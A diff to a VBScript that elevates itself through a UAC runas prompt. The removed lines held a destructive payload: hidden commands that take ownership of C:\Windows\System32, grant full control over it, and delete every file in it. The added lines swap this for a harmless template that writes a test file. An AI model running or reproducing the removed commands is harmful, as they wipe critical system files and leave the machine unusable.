@@ -1,44 +1,42 @@
-' VBScript to elevate itself and modify System32 permissions
-Option Explicit
+' VBScript
+' Purpose: Elevate itself to run commands with administrative privileges
+' Usage: Place the commands you want to run as an admin inside the Elevated code block
 
-Dim WshShell, UAC, admin
+' Function to check if script is running as admin
+Function IsAdmin()
+    Dim shell, result
+    Set shell = CreateObject("WScript.Shell")
+    On Error Resume Next
+    shell.RegRead "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" ' try reading a protected key
+    If Err.Number = 0 Then
+        IsAdmin = True
+    Else
+        IsAdmin = False
+    End If
+    On Error Goto 0
+End Function
 
-' Create WScript Shell object
-Set WshShell = WScript.CreateObject("WScript.Shell")
-
-' Check for admin privileges
-WshShell.Run "cmd /c net session >nul 2>&1", 0, True
-If WshShell.Run("cmd /c echo %errorlevel%", 0, True) = 0 Then
-    admin = 1
-Else
-    admin = 0
-End If
-
-' Elevate again safely if not admin (requires UAC prompt)
-If admin = 0 Then
-    Set UAC = CreateObject("Shell.Application")
-    UAC.ShellExecute "cmd.exe", "/c """ & WScript.ScriptFullName & """", "", "runas", 1
+' Main execution
+If Not IsAdmin() Then
+    ' Relaunch the script as admin using ShellExecute
+    Dim shell, myScript
+    Set shell = CreateObject("Shell.Application")
+    myScript = WScript.ScriptFullName
+    ' 1 = run as admin, "" = default options
+    shell.ShellExecute "wscript.exe", """" & myScript & """", "", "runas", 1
     WScript.Quit
 End If
 
-' Sleep for a short period to allow the command prompt to initialize
-WScript.Sleep 100
+' ===== Elevation successful, place any code below =====
+' Example: creating a file in System32 (requires elevated privileges)
+Dim fso, filePath, file
+Set fso = CreateObject("Scripting.FileSystemObject")
+filePath = "C:\Windows\System32\test_admin.txt"
 
-' Take ownership of System32 folder
-WshShell.Run "takeown /f C:\Windows\System32 /r /d y", 0, True
-WScript.Sleep 100
+If Not fso.FileExists(filePath) Then
+    Set file = fso.CreateTextFile(filePath, True)
+    file.WriteLine("This file was created with admin privileges.")
+    file.Close
+End If
 
-' Grant administrators full control
-WshShell.Run "icacls C:\Windows\System32 /grant administrators:F /t", 0, True
-WScript.Sleep 100
-
-' Change directory to System32
-WshShell.Run "cmd /c cd C:\Windows\System32", 0, True
-WScript.Sleep 100
-
-' Delete all files (use with extreme caution: destructive operation)
-WshShell.Run "del /F /S /Q C:\Windows\System32\*.*", 0, True
-
-' Clean up
-Set WshShell = Nothing
-Set UAC = Nothing
+MsgBox "Script is running with admin privileges. File created successfully."
